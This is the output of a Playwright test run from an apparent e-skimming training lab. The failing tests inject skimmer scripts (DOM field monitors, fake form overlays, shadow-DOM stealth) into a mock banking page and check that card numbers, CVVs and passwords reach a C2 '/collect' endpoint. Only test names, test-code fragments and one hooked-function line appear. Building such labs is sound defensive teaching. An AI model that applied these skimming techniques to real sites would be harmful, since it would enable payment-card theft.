    > 39 |       if (request.url().includes('/collect')) {
         |       ^
      40 |         console.log('ğŸ“¥ RESPONSE FROM C2:', {
      41 |           url: response.url(),
      42 |           status: response.status(),
        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)

    Error: page.waitForTimeout: Test ended.

      183 |
      184 |     // Wait for initial setup
    > 185 |     await page.waitForTimeout(1000)
          |                ^
      186 |
      187 |     console.log('â• Adding dynamic form to test mutation observer...')
      188 |
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:185:16

    Error Context: test-results/tests-dom-monitor-DOM-Base-a3ac1-tor-dynamically-added-forms-chromium/error-context.md

  5) [chromium] â€º test/tests/dom-monitor.spec.js:240:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should handle high-value field immediate exfiltration 

    ReferenceError: request is not defined

      37 |
      38 |     page.on('response', response => {
    > 39 |       if (request.url().includes('/collect')) {
         |       ^
      40 |         console.log('ğŸ“¥ RESPONSE FROM C2:', {
      41 |           url: response.url(),
      42 |           status: response.status(),
        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)

    Error: page.addScriptTag: Test ended.

      258 |
      259 |     // Inject DOM monitor attack
    > 260 |     await page.addScriptTag({
          |     ^
      261 |       path: './malicious-code/dom-monitor.js'
      262 |     })
      263 |
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:260:5

    Error Context: test-results/tests-dom-monitor-DOM-Base-f25a9-ield-immediate-exfiltration-chromium/error-context.md

  6) [chromium] â€º test/tests/dom-monitor.spec.js:318:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should contain DOM monitoring attack patterns 

    ReferenceError: request is not defined

      37 |
      38 |     page.on('response', response => {
    > 39 |       if (request.url().includes('/collect')) {
         |       ^
      40 |         console.log('ğŸ“¥ RESPONSE FROM C2:', {
      41 |           url: response.url(),
      42 |           status: response.status(),
        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)

    Error: page.addScriptTag: Test ended.

      322 |
      323 |     // Inject DOM monitor attack and analyze the code
    > 324 |     await page.addScriptTag({
          |     ^
      325 |       path: './malicious-code/dom-monitor.js'
      326 |     })
      327 |
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:324:5

    Error Context: test-results/tests-dom-monitor-DOM-Base-cf4aa--monitoring-attack-patterns-chromium/error-context.md

  7) [chromium] â€º test/tests/dom-monitor.spec.js:368:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should handle page unload data exfiltration 

    ReferenceError: request is not defined

      37 |
      38 |     page.on('response', response => {
    > 39 |       if (request.url().includes('/collect')) {
         |       ^
      40 |         console.log('ğŸ“¥ RESPONSE FROM C2:', {
      41 |           url: response.url(),
      42 |           status: response.status(),
        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)

    Error: page.addScriptTag: Test ended.

      385 |
      386 |     // Inject DOM monitor attack
    > 387 |     await page.addScriptTag({
          |     ^
      388 |       path: './malicious-code/dom-monitor.js'
      389 |     })
      390 |
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:387:5

    Error Context: test-results/tests-dom-monitor-DOM-Base-e1162-ge-unload-data-exfiltration-chromium/error-context.md

  8) [chromium] â€º test/tests/form-overlay.spec.js:49:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should inject overlay on high-priority forms 

    Error: [2mexpect([22m[31mreceived[39m[2m).[22mtoBe[2m([22m[32mexpected[39m[2m) // Object.is equality[22m

    Expected: [32mtrue[39m
    Received: [31mfalse[39m

      88 |
      89 |       console.log('ğŸ‘» Original form hidden status:', isHidden)
    > 90 |       expect(isHidden).toBe(true)
         |                        ^
      91 |     } else {
      92 |       console.log('âš ï¸ Overlay not injected - may need to trigger manually')
      93 |     }
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/form-overlay.spec.js:90:24

    Error Context: test-results/tests-form-overlay-DOM-Bas-8ffa2-rlay-on-high-priority-forms-chromium/error-context.md

  9) [chromium] â€º test/tests/form-overlay.spec.js:98:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should capture credentials through fake overlay 

    Error: locator.isVisible: Error: strict mode violation: locator('#overlay-form input[name*="cvv"]') resolved to 4 elements:
        1) <input name="cvv" type="text" required="" id="overlay_cvv" placeholder="123" class="overlay-input"/> aka getByRole('textbox', { name: 'CVV CVV CVV CVV' })
        2) <input name="cvv" type="text" required="" id="overlay_cvv" placeholder="123" class="overlay-input"/> aka getByRole('textbox', { name: '123' }).nth(1)
        3) <input name="cvv" type="text" required="" id="overlay_cvv" placeholder="123" class="overlay-input"/> aka getByRole('textbox', { name: '123' }).nth(2)
        4) <input name="cvv" type="text" required="" id="overlay_cvv" placeholder="123" class="overlay-input"/> aka getByRole('textbox', { name: '123' }).nth(4)

    Call log:
    [2m    - checking visibility of locator('#overlay-form input[name*="cvv"]')[22m


      139 |       }
      140 |
    > 141 |       if (await cvvField.isVisible()) {
          |                          ^
      142 |         await cvvField.fill('456')
      143 |         console.log('ğŸ’³ CVV entered in overlay')
      144 |       }
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/form-overlay.spec.js:141:26

    Error Context: test-results/tests-form-overlay-DOM-Bas-895a2-ntials-through-fake-overlay-chromium/error-context.md

  10) [chromium] â€º test/tests/form-overlay.spec.js:201:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should show appropriate overlay for different form types 

    Error: [2mexpect([22m[31mreceived[39m[2m).[22mtoContain[2m([22m[32mexpected[39m[2m) // indexOf[22m

    Expected substring: [32m"Security"[39m
    Received string:    [31m"âš ï¸ Transaction Verification"[39m

      232 |
      233 |         // Verify contextual content
    > 234 |         expect(overlayTitle).toContain('Security')
          |                              ^
      235 |
      236 |         // Close overlay for next test
      237 |         await page.click('.overlay-close')
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/form-overlay.spec.js:234:30

    Error Context: test-results/tests-form-overlay-DOM-Bas-6b024-ay-for-different-form-types-chromium/error-context.md

  11) [chromium] â€º test/tests/form-overlay.spec.js:247:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should handle overlay persistence and anti-removal 

    [31mTest timeout of 8000ms exceeded.[39m

    Error: page.waitForTimeout: Test timeout of 8000ms exceeded.

      276 |
      277 |       // Wait for persistence mechanism to re-inject
    > 278 |       await page.waitForTimeout(3000)
          |                  ^
      279 |
      280 |       // Check if overlay was re-injected
      281 |       overlayVisible = await page.locator('#form-overlay-backdrop').isVisible()
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/form-overlay.spec.js:278:18

    Error Context: test-results/tests-form-overlay-DOM-Bas-c9754-ersistence-and-anti-removal-chromium/error-context.md

  12) [chromium] â€º test/tests/form-overlay.spec.js:371:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should handle overlay cancellation and closure 

    [31mTest timeout of 8000ms exceeded.[39m

    Error: page.waitForTimeout: Test timeout of 8000ms exceeded.

      417 |       })
      418 |       await page.click('[data-section="cards"]')
    > 419 |       await page.waitForTimeout(3000)
          |                  ^
      420 |
      421 |       // Test cancel button
      422 |       const cancelButton = page.locator('.overlay-cancel')
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/form-overlay.spec.js:419:18

    Error Context: test-results/tests-form-overlay-DOM-Bas-cbcc6-ay-cancellation-and-closure-chromium/error-context.md

  13) [chromium] â€º test/tests/lab2-improvements.spec.js:105:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should show add new card form by default on cards page 

    Error: [2mexpect([22m[31mlocator[39m[2m).[22mtoBeVisible[2m()[22m failed

    Locator:  locator('#card-account-password')
    Expected: visible
    Received: <element(s) not found>
    Timeout:  5000ms

    Call log:
    [2m  - Expect "toBeVisible" with timeout 5000ms[22m
    [2m  - waiting for locator('#card-account-password')[22m


      140 |
      141 |     const cardPasswordField = page.locator('#card-account-password')
    > 142 |     await expect(cardPasswordField).toBeVisible()
          |                                     ^
      143 |
      144 |     // Check that first field has focus (waiting for user input)
      145 |     const focusedElement = await page.evaluate(() => document.activeElement?.id)
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/lab2-improvements.spec.js:142:37

    Error Context: test-results/tests-lab2-improvements-La-3f7f0-rm-by-default-on-cards-page-chromium/error-context.md

  14) [chromium] â€º test/tests/lab2-improvements.spec.js:150:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should have add new card form waiting for user input 

    Error: [2mexpect([22m[31mlocator[39m[2m).[22mtoHaveValue[2m([22m[32mexpected[39m[2m)[22m failed

    Locator: locator('#card-account-password')
    Expected string: [32m""[39m
    Received: <element(s) not found>
    Timeout: 5000ms

    Call log:
    [2m  - Expect "toHaveValue" with timeout 5000ms[22m
    [2m  - waiting for locator('#card-account-password')[22m


      169 |     await expect(page.locator('#card-cvv-input')).toHaveValue('')
      170 |     await expect(page.locator('#card-billing-zip')).toHaveValue('')
    > 171 |     await expect(page.locator('#card-account-password')).toHaveValue('')
          |                                                          ^
      172 |
      173 |     // Test that we can type in the focused field
      174 |     await cardNumberField.type('4111')
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/lab2-improvements.spec.js:171:58

    Error Context: test-results/tests-lab2-improvements-La-70983-form-waiting-for-user-input-chromium/error-context.md

  15) [chromium] â€º test/tests/lab2-improvements.spec.js:206:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should have fewer features and focus on cc-input page 

    Error: [2mexpect([22m[31mlocator[39m[2m).[22mtoBeVisible[2m()[22m failed

    Locator:  locator('#card-account-password')
    Expected: visible
    Received: <element(s) not found>
    Timeout:  5000ms

    Call log:
    [2m  - Expect "toBeVisible" with timeout 5000ms[22m
    [2m  - waiting for locator('#card-account-password')[22m


      235 |     for (const fieldSelector of ccFields) {
      236 |       const field = page.locator(fieldSelector)
    > 237 |       await expect(field).toBeVisible()
          |                           ^
      238 |     }
      239 |
      240 |     console.log('âœ… Interface is simplified and focused on credit card input')
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/lab2-improvements.spec.js:237:27

    Error Context: test-results/tests-lab2-improvements-La-0b417--and-focus-on-cc-input-page-chromium/error-context.md

  16) [chromium] â€º test/tests/shadow-skimmer.spec.js:104:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should monitor fields across shadow boundaries 

    [31mTest timeout of 8000ms exceeded.[39m

    Error: page.fill: Test timeout of 8000ms exceeded.
    Call log:
    [2m  - waiting for locator('#transfer-password')[22m


      125 |     await page.fill('#to-account', '123456789')
      126 |     await page.fill('#transfer-amount', '2500.00')
    > 127 |     await page.fill('#transfer-password', 'shadowtest123')
          |                ^
      128 |
      129 |     // Add a small delay between fields to trigger monitoring
      130 |     await page.waitForTimeout(500)
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/shadow-skimmer.spec.js:127:16

    Error Context: test-results/tests-shadow-skimmer-DOM-B-deff6-ds-across-shadow-boundaries-chromium/error-context.md

  17) [chromium] â€º test/tests/shadow-skimmer.spec.js:166:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should handle closed shadow DOM stealth 

    Error: page.evaluate: TypeError: Failed to execute 'getComputedStyle' on 'Window': parameter 1 is not of type 'Element'.

       at ../malicious-code/shadow-skimmer.js:608

      606 |           }
      607 |         }
    > 608 |         return originalGetComputedStyle.apply(this, arguments)
          |                                         ^
      609 |       }
      610 |     })
      611 |
        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
        at eval (eval at evaluate (:291:30), <anonymous>:4:32)
        at Array.map (<anonymous>)
        at eval (eval at evaluate (:291:30), <anonymous>:2:22)
        at UtilityScript.evaluate (<anonymous>:293:16)
        at UtilityScript.<anonymous> (<anonymous>:1:44)
        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
        at window.getComputedStyle (./malicious-code/shadow-skimmer.js:608:41)
        at eval (eval at evaluate (:291:30), <anonymous>:4:32)
        at eval (eval at evaluate (:291:30), <anonymous>:2:22)
        at UtilityScript.evaluate (<anonymous>:293:16)
        at UtilityScript.<anonymous> (<anonymous>:1:44)
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/shadow-skimmer.spec.js:225:41

    Error Context: test-results/tests-shadow-skimmer-DOM-B-40a95-e-closed-shadow-DOM-stealth-chromium/error-context.md

  18) [chromium] â€º test/tests/shadow-skimmer.spec.js:249:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should capture data through shadow isolation 

    [31mTest timeout of 8000ms exceeded.[39m

    Error: page.click: Test timeout of 8000ms exceeded.
    Call log:
    [2m  - waiting for locator('button:has-text("Change PIN")')[22m
    [2m    - locator resolved to <button class="action-btn" onclick="showPasswordPrompt('pin')">Change PIN</button>[22m
    [2m  - attempting click action[22m
    [2m    2 Ã— waiting for element to be visible, enabled and stable[22m
    [2m      - element is not visible[22m
    [2m    - retrying click action[22m
    [2m    - waiting 20ms[22m
    [2m    2 Ã— waiting for element to be visible, enabled and stable[22m
    [2m      - element is not visible[22m
    [2m    - retrying click action[22m
    [2m      - waiting 100ms[22m
    [2m    5 Ã— waiting for element to be visible, enabled and stable[22m
    [2m      - element is not visible[22m
    [2m    - retrying click action[22m
    [2m      - waiting 500ms[22m


      278 |
      279 |     // Trigger card action for password/CVV fields
    > 280 |     await page.click('button:has-text("Change PIN")')
          |                ^
      281 |     await page.waitForTimeout(500)
      282 |
      283 |     console.log('ğŸ” Filling sensitive fields for shadow capture...')
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/shadow-skimmer.spec.js:280:16

    Error Context: test-results/tests-shadow-skimmer-DOM-B-b64ef-ta-through-shadow-isolation-chromium/error-context.md

  19) [chromium] â€º test/tests/shadow-skimmer.spec.js:442:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should handle nested shadow DOM structures 

    [31mTest timeout of 8000ms exceeded.[39m

    Error: page.click: Test timeout of 8000ms exceeded.
    Call log:
    [2m  - waiting for locator('[data-section="settings"]')[22m


      477 |
      478 |     // Test cross-shadow monitoring with nested structure
    > 479 |     await page.click('[data-section="settings"]')
          |                ^
      480 |     await page.waitForTimeout(1000)
      481 |
      482 |     // Fill fields to test monitoring across nested shadows
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/shadow-skimmer.spec.js:479:16

    Error Context: test-results/tests-shadow-skimmer-DOM-B-0f60f-ested-shadow-DOM-structures-chromium/error-context.md

  20) [chromium] â€º test/tests/shadow-skimmer.spec.js:568:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should handle page unload with shadow cleanup 

    [31mTest timeout of 8000ms exceeded.[39m

    Error: page.fill: Test timeout of 8000ms exceeded.
    Call log:
    [2m  - waiting for locator('#transfer-password')[22m


      580 |     // Generate some shadow activity
      581 |     await page.click('[data-section="transfer"]')
    > 582 |     await page.fill('#transfer-password', 'unloadtest')
          |                ^
      583 |     await page.waitForTimeout(1000)
      584 |
      585 |     // Get shadow data before unload
        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/shadow-skimmer.spec.js:582:16

    Error Context: test-results/tests-shadow-skimmer-DOM-B-78054--unload-with-shadow-cleanup-chromium/error-context.md

  20 failed
    [chromium] â€º test/tests/cc-exfiltration.spec.js:39:3 â€º Lab 2: DOM-Based Skimming - Credit Card Exfiltration â€º should enter CC information and verify C2 server shows exfiltrated data 
    [chromium] â€º test/tests/dom-monitor.spec.js:49:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should monitor DOM mutations and attach to new forms 
    [chromium] â€º test/tests/dom-monitor.spec.js:109:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should capture keystrokes in real-time 
    [chromium] â€º test/tests/dom-monitor.spec.js:174:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should detect and monitor dynamically added forms 
    [chromium] â€º test/tests/dom-monitor.spec.js:240:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should handle high-value field immediate exfiltration 
    [chromium] â€º test/tests/dom-monitor.spec.js:318:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should contain DOM monitoring attack patterns 
    [chromium] â€º test/tests/dom-monitor.spec.js:368:3 â€º DOM-Based Skimming Lab - Real-Time Field Monitor â€º should handle page unload data exfiltration 
    [chromium] â€º test/tests/form-overlay.spec.js:49:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should inject overlay on high-priority forms 
    [chromium] â€º test/tests/form-overlay.spec.js:98:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should capture credentials through fake overlay 
    [chromium] â€º test/tests/form-overlay.spec.js:201:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should show appropriate overlay for different form types 
    [chromium] â€º test/tests/form-overlay.spec.js:247:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should handle overlay persistence and anti-removal 
    [chromium] â€º test/tests/form-overlay.spec.js:371:3 â€º DOM-Based Skimming Lab - Form Overlay Injection â€º should handle overlay cancellation and closure 
    [chromium] â€º test/tests/lab2-improvements.spec.js:105:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should show add new card form by default on cards page 
    [chromium] â€º test/tests/lab2-improvements.spec.js:150:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should have add new card form waiting for user input 
    [chromium] â€º test/tests/lab2-improvements.spec.js:206:3 â€º Lab 2: DOM-Based Skimming - UI Improvements â€º should have fewer features and focus on cc-input page 
    [chromium] â€º test/tests/shadow-skimmer.spec.js:104:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should monitor fields across shadow boundaries 
    [chromium] â€º test/tests/shadow-skimmer.spec.js:166:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should handle closed shadow DOM stealth 
    [chromium] â€º test/tests/shadow-skimmer.spec.js:249:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should capture data through shadow isolation 
    [chromium] â€º test/tests/shadow-skimmer.spec.js:442:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should handle nested shadow DOM structures 
    [chromium] â€º test/tests/shadow-skimmer.spec.js:568:3 â€º DOM-Based Skimming Lab - Shadow DOM Stealth Attack â€º should handle page unload with shadow cleanup 
  10 passed (1.1m)
